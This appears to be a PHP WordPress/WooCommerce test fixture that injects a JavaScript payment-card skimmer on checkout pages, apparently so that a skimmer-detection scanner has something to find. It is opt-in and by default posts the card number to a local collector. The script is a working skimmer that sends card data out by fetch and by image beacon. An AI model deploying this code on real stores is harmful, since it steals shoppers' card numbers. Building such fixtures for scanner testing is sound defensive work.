<?php
/**
 * ============================================================================
 *  PNAKOTIC TEST SKIMMER  --  OPT-IN, LOCAL TESTBED ONLY
 * ============================================================================
 *
 *  Adapted from woo-checkout-scanner/test-fixtures/test-skimmer.functions.php.
 *
 *  Off unless the option mandacaru_test_skimmer is "1":
 *      docker compose run --rm wpcli option update mandacaru_test_skimmer 1
 *
 *  Unlike the original it sends what is typed into the card number field (so
 *  Mandacaru's test-card exfiltration check has something to find), but only to
 *  the testbed's collector on 127.0.0.1 (a different host from the store's localhost) (MANDACARU_COLLECTOR_URL, or the option
 *  mandacaru_test_skimmer_url). On blur of the card number field and on a Place
 *  Order click it makes one fetch POST and one image beacon.
 *
 *  Works in the classic and the block checkout: listeners sit on the document
 *  in the capture phase, so inputs rendered later are covered.
 * ============================================================================
 */

add_action( 'wp_footer', function () {

	if ( get_option( 'mandacaru_test_skimmer' ) !== '1' ) {
		return;
	}
	if ( ! function_exists( 'is_checkout' ) || ! is_checkout() ) {
		return;
	}

	$exfil_url = get_option( 'mandacaru_test_skimmer_url' );
	if ( ! $exfil_url ) {
		$exfil_url = getenv( 'MANDACARU_COLLECTOR_URL' ) ? getenv( 'MANDACARU_COLLECTOR_URL' ) : 'http://127.0.0.1:8199/collect';
	}
	?>
	<script id="pnakotic-test-skimmer">
	/* ==== PNAKOTIC TEST SKIMMER -- TESTBED ONLY ==== */
	(function () {
		var EXFIL = <?php echo wp_json_encode( $exfil_url ); ?>;
		var CARD = 'input[autocomplete="cc-number"], input[name*="card" i][name*="number" i]';
		var PLACE = '#place_order, .wc-block-components-checkout-place-order-button';
		console.warn('[PNAKOTIC-TEST-SKIMMER] active; sends the card number field to ' + EXFIL);

		function cardValue() {
			var el = document.querySelector(CARD);
			return el ? el.value : '';
		}

		function exfil(trigger) {
			var value = cardValue();
			var body = JSON.stringify({ trigger: trigger, card: value, note: 'PNAKOTIC-TEST-SKIMMER' });
			try {
				fetch(EXFIL, { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: body });
			} catch (e) {}
			try {
				new Image().src = EXFIL + '?t=' + encodeURIComponent(trigger) + '&c=' + encodeURIComponent(value);
			} catch (e) {}
		}

		document.addEventListener('blur', function (ev) {
			var t = ev.target;
			if (t && t.matches && t.matches(CARD)) { exfil('blur'); }
		}, true);

		document.addEventListener('click', function (ev) {
			var t = ev.target;
			if (t && t.closest && t.closest(PLACE)) { exfil('click'); }
		}, true);
	})();
	/* ==== END PNAKOTIC TEST SKIMMER ==== */
	</script>
	<?php
}, 100 );
